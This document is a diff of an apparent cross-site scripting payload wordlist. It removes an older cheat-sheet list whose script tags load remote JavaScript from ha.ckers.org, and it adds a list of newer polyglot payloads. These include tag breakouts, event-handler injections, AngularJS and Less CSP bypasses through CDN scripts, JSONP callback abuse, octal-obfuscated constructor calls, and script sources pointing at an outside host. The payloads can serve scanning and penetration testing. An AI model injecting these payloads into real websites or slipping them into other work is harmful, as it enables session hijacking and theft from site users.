@@ -1,68 +1,114 @@
-<SCRIPT>alert('XSS');</SCRIPT>
-'';!--"<XSS>=&{()}
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<IMG SRC="javascript:alert('XSS');">
-<IMG SRC=javascript:alert('XSS')>
-<IMG SRC=JaVaScRiPt:alert('XSS')>
-<IMG SRC=javascript:alert(&quot;XSS&quot;)>
-<IMG SRC=`javascript:alert("Ablack says, 'XSS'")`>
-<IMG SRC="jav&#x09;ascript:alert('XSS');">
-<IMG SRC="jav&#x0A;ascript:alert('XSS');">
-<IMG SRC="jav&#x0D;ascript:alert('XSS');">
-<IMG SRC=" &#14;  javascript:alert('XSS');">
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
-<IMG SRC="javascript:alert('XSS')"
-<SCRIPT>a=/XSS/
-\";alert('XSS');//
-<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
-<BODY BACKGROUND="javascript:alert('XSS')">
-<BODY ONLOAD=alert('XSS')>
-<IMG DYNSRC="javascript:alert('XSS')">
-<IMG LOWSRC="javascript:alert('XSS')">
-<BGSOUND SRC="javascript:alert('XSS');">
-<BR SIZE="&{alert('XSS')}">
-<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
-<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
-<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
-<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
-<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
-<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
-<IMG SRC='vbscript:msgbox("XSS")'>
-<IMG SRC="mocha:[code]">
-<IMG SRC="livescript:[code]">
-<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
-<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
-<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">
-<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
-<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
-<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
-<TABLE BACKGROUND="javascript:alert('XSS')">
-<DIV STYLE="background-image: url(javascript:alert('XSS'))">
-<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
-<DIV STYLE="width: expression(alert('XSS'));">
-<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
-<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
-<XSS STYLE="xss:expression(alert('XSS'))">
-exp/*<XSS STYLE='no\xss:noxss("*//*");
-<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
-<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
-<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
-<BASE HREF="javascript:alert('XSS');//">
-<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
-<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
-getURL("javascript:alert('XSS')")
-a="get";
-<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
-<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
-<HTML><BODY>
-<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
-<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
-<? echo('<SCR)';
-<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
-<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /K>confirm`1`</Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script Src=Data:,confirm`1`>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=Data:,confirm`1`></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/api.json?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/api/api.json?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/cart.json?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/api/cart.json?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/cart/add.json?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/search.json?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/api/search.json?callback=confirm`1`//></Script/>
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=https:ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js></Script/><B /Style=position:fixed;top:0;left:0;font-size:999px%0C/Ng-App /Ng-Csp /Ng-Mouseenter=$event.view.confirm(1)>___
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Style /Type=text/less>k{n:`function(){confirm(1)}()`}</Style/><Script /Src=https:cdnjs.cloudflare.com/ajax/libs/less.js/2.7.1/less.min.js></Script/>
+'"--!><Script /K/Src=https:@14.rs>confirm%601%60</Script/K>
+'"--!><Script /K/>confirm`1`</Script /K/>
+"--!><Svg/Onload=confirm`1`>"
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm`1`>
+'"--!><Image%0CSrcset=.%0COnerror=confirm%601%60 //
+'"--!>%25%75003CSvg /%25%753008Svg /%25%75FF1CSvg /Onload=confirm`1` //
+'"--!><Input /Autofocus /Onfocus=confirm`1` //
+'" /Autof<K>ocus /O<K>nfocus=confirm`1` //
+'"--!><Body /Onpageshow=confirm`1`>
+'"--!><Svg><Set /Onbegin=confirm`1`>
+"'--!><Html/Onmouseenter=confirm`1`//>"
+'" /Style=position:fixed;top:0;left:0;font-size:999px; /Onmouseenter=confirm`1` //
+'"--!><K /Onbeforescriptexecute=confirm`1` //
+'"--!><Svg><Script /Xlink:Href=Data:,confirm`1` />
+'"--!><Object /Data=JavaS%26%2399ript:confirm`1`>
+'"--!></Iframe><Iframe /SrcDoc=%26lt;Svg/O%26%23x6Eload%26equals;confirm%26lpar;1%26rpar;%26gt;>
+'"--!><Base /Href=https:@14.rs>
+'"--!><K:script xmlns:K="http://www.w3.org/1999/xhtml">confirm`1`</K:script>
+'"--!><K /Ng-App>{{a="".constructor.prototype;a.charAt=a.trim;$eval("a,confirm`1`,b")}}
+'"--!><<!--%23set%20var="x"value="svg /o"var="y"value="nload=confirm`1`"--><!--%23echo%20var="x"var="y"-->>
+'-confirm`1`-'
+1'?confirm`1`:'
+'-top['con\x66irm']`1`-'
+1'?top['con\x66irm']`1`:'
+'-[location='Javas\x63ript:confirm%25281%2529']-'
+1'?location='Javas\x63ript:confirm%25281%2529':'
+'-[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\143\157\156\146\151\162\155\50\61\51')()-'
+'?[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\143\157\156\146\151\162\155\50\61\51')():'
+"-confirm`1`-"
+1"?confirm`1`:"
+"-top["con\x66irm"]`1`-"
+1"?top["con\x66irm"]`1`:"
+"-[location="Javas\x63ript:confirm%25281%2529"]-"
+1"?location="Javas\x63ript:confirm%25281%2529":"
+"-[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\143\157\156\146\151\162\155\50\61\51")()-"
+"?[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\143\157\156\146\151\162\155\50\61\51")():"
+\'-confirm`1`//
+\'-confirm`1`<!--
+\'-confirm`1`%0A-->
+\'-confirm`1`}//
+\'-confirm`1`}<!--
+\'-confirm`1`}%0A-->
+\'-confirm`1`,//
+\'-confirm`1`,<!--
+\'-confirm`1`,%0A-->
+\'-confirm`1`};k={//
+\'-confirm`1`};k={<!--
+\'-confirm`1`};k={%0A-->
+\'}confirm`1`;k:{//
+\'}confirm`1`;k:{<!--
+\'}confirm`1`;k:{%0A-->
+\'}confirm`1`?0:function k(){//
+\'}confirm`1`?0:function k(){<!--
+\'}confirm`1`?0:function k(){%0A-->
+\"-confirm`1`//
+\"-confirm`1`<!--
+\"-confirm`1`%0A-->
+\"-confirm`1`}//
+\"-confirm`1`}<!--
+\"-confirm`1`}%0A-->
+\"-confirm`1`,//
+\"-confirm`1`,<!--
+\"-confirm`1`,%0A-->
+\"-confirm`1`};k={//
+\"-confirm`1`};k={<!--
+\"-confirm`1`};k={%0A-->
+\"}confirm`1`;k:{//
+\"}confirm`1`;k:{<!--
+\"}confirm`1`;k:{%0A-->
+\"}confirm`1`?0:function k(){//
+\"}confirm`1`?0:function k(){<!--
+\"}confirm`1`?0:function k(){%0A-->
+'"--!></Script%0C><Script/Src=https:14.rs>
+'"--!></Script/><Svg/Onload=confirm`1`//
+"><svg/onload=alert(/1/)>
+</script><script>a lert(/1/)</script>
+<!'/*!"/*!\'/*\"/*--!><Input/Autofocus/%0D*/Onfocus=confirm%601%60//><Svg>
+"--!><Svg/Onload=confirm`1`>"
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm`1`>
+'"--!><Script /K/>confirm`1`//</Script /K/><!--
+'"--!><Image%0CSrcset=.%0COnerror=confirm%601%60 //
+'"--!>%25%75003CSvg /%25%753008Svg /%25%75FF1CSvg /Onload=confirm`1` //
+'" /Autof<K>ocus /O<K>nfocus=confirm`1` //
+'"--!><Body /Onpageshow=confirm`1`>
+'"--!><Svg><Set /Onbegin=confirm`1`>
+"'--!><Html/Onmouseenter=confirm`1`//>"
+'" /Style=position:fixed;top:0;left:0;font-size:999px; /Onmouseenter=confirm`1` //
+'"--!><K /Onbeforescriptexecute=confirm`1` //
+'"--!><Svg><Script /Xlink:Href=https:@14.rs /> 
+'"--!><Object /Data=JavaS%26%2399ript:confirm`1`>
+'"--!></Iframe><Iframe /SrcDoc=%26lt;Svg/O%26%23x6Eload%26equals;confirm%26lpar;1%26rpar;%26gt;>
+'"--!><Base /Href=https:@14.rs>
+<!'/*!"/*\'/*\"/**/-top[`con\x66irm`]`1`//><svg>
+<!'/*!"/*\'/*\"/**/-[location=`Javas\x63ript:confirm%25281%2529`]//><svg>
+<!'/*!"/*\'/*\"/**/-[][`\146\151\154\164\145\162`][`\143\157\156\163\164\162\165\143\164\157\162`](`\143\157\156\146\151\162\155\50\61\51`)()//><svg>
+<!'/*!"/*\'/*\"/**/-confirm`1`,//><svg>
+<!'/*!"/*\'/*\"/**/-confirm`1`};//><svg>
+"-confirm(/1/)-"
+<!'/*!"/*\'/*\"/**/}confirm`1`;k:{//><svg>
+<!'/*!"/*\'/*\"/**/}confirm`1`?0:function k(){//><svg>
